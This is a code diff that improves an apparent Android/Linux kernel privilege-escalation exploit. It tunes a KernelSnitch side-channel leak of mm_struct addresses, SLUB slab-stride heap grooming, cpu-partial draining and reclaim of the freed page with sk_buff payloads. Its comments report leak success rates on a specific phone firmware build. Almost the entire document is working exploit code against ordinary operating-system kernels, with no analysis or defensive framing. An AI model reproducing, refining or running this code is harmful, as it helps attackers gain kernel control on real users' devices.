@@ -154,13 +154,24 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
 
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  /* The bruteforce scans mm_struct candidates at mm_struct_sz stride.
+   * SLUB pads mm_struct objects to MM_STRUCT_SLAB_SZ (slabinfo obj_size),
+   * so scanning at the smaller sizeof(mm_struct) stride only matches the
+   * few slots where the two strides coincide (lcm positions) and misses
+   * every other object.  Scan at the slab stride instead. */
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SLAB_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  kernelsnitch_set_profile(
-      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
-      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
-      SLIDE_KSNITCH_AVERAGE);
+  /* The reduced app profile (2048/64/8) never produced a leak on
+   * e3q-S9280ZCS6DZF2 (24/24 pipe page leaks failed), while the library
+   * default (4096/128/8) leaks mm_struct in ~60% of attempts in the
+   * root-umh variant.  Allow falling back to the default profile. */
+  if (!getenv("KSNITCH_DEFAULT_PROFILE")) {
+    kernelsnitch_set_profile(
+        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
+        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
+        SLIDE_KSNITCH_AVERAGE);
+  }
 #endif
 }
 
@@ -432,6 +443,19 @@ int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
   return 0;
 }
 
+int exploit_core(void) {
+  const char *env = getenv("EXPLOIT_CORE");
+  if (env && *env) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(env, &end, 0);
+    if (!errno && end != env && !*end && value >= 0 && value < 32) {
+      return (int)value;
+    }
+  }
+  return CORE;
+}
+
 pid_t clone_child(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
@@ -439,7 +463,7 @@ pid_t clone_child(void) {
     if (getppid() == 1) {
       _exit(0);
     }
-    pin_to_core(CORE);
+    pin_to_core(exploit_core());
     for (;;) {
       pause();
     }
@@ -743,7 +767,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
-  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SLAB_SZ;
   prepare_ctxs();
 
   skb_buf = malloc(SKB_SEND_SIZE);
@@ -763,10 +787,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SLAB_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
+      !getenv("KSNITCH_DEFAULT_PROFILE")) {
     kernelsnitch_set_profile(
         ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
         SLIDE_KSNITCH_REPEAT_MEASUREMENT,
@@ -827,7 +852,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
-          leaked, base, (leaked - base) / MM_STRUCT_SZ);
+          leaked, base, (leaked - base) / MM_STRUCT_SLAB_SZ);
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -860,7 +885,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
 
-  pin_to_core(CORE);
+  pin_to_core(exploit_core());
   sched_yield();
   sched_yield();
   sched_yield();
@@ -892,7 +917,18 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
-  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
+  size_t drain_triggers = MM_DRAIN_TRIGGERS > 0
+      ? (size_t)MM_DRAIN_TRIGGERS
+      : prepare_ctx.mm_cnt / mm_objs_per_slab;
+  const char *drain_env = getenv("MM_DRAIN_TRIGGERS");
+  if (drain_env && *drain_env) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long value = strtoul(drain_env, &end, 0);
+    if (!errno && end != drain_env && !*end && value <= 31) {
+      drain_triggers = value ? (size_t)value : 1;
+    }
+  }
   for (size_t i = 0; i < drain_triggers; i++) {
     size_t index = i * mm_objs_per_slab;
     SYSCHK(close(prepare_ctx.memfds[index]));
@@ -901,10 +937,36 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     prepare_ctx.childs[index] = -1;
   }
   pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
+
+  /* Free ALL remaining prepare_ctx objects BEFORE the reclaim sends.
+   * The target slab page can only return to the buddy allocator when
+   * every object in it has been freed.  Previously this cleanup ran
+   * after the sends, so the target page was never available for the
+   * sk_buff fragments to reclaim. */
+  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+    if (prepare_ctx.memfds[i] >= 0) {
+      SYSCHK(close(prepare_ctx.memfds[i]));
+      prepare_ctx.memfds[i] = -1;
+    }
+    if (prepare_ctx.childs[i] > 0) {
+      kill_child(prepare_ctx.childs[i]);
+      prepare_ctx.childs[i] = -1;
+    }
+  }
+
   int reclaim_sends = SKB_RECLAIM_SENDS;
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
 #endif
+  const char *sends_env = getenv("SKB_RECLAIM_SENDS");
+  if (sends_env && *sends_env) {
+    char *end = NULL;
+    errno = 0;
+    long value = strtol(sends_env, &end, 0);
+    if (!errno && end != sends_env && !*end && value >= 1 && value <= 512) {
+      reclaim_sends = (int)value;
+    }
+  }
   int reclaim_sent = 0;
   for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
@@ -918,17 +980,6 @@ uintptr_t prepare_kernel_page(int payload_mode) {
           reclaim_sent, reclaim_sends, payload_mode);
   kernelsnitch_cleanup(ks);
   ks = NULL;
-
-  for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
-    if (prepare_ctx.memfds[i] >= 0) {
-      SYSCHK(close(prepare_ctx.memfds[i]));
-      prepare_ctx.memfds[i] = -1;
-    }
-    if (prepare_ctx.childs[i] > 0) {
-      kill_child(prepare_ctx.childs[i]);
-      prepare_ctx.childs[i] = -1;
-    }
-  }
 
   return base;
 }
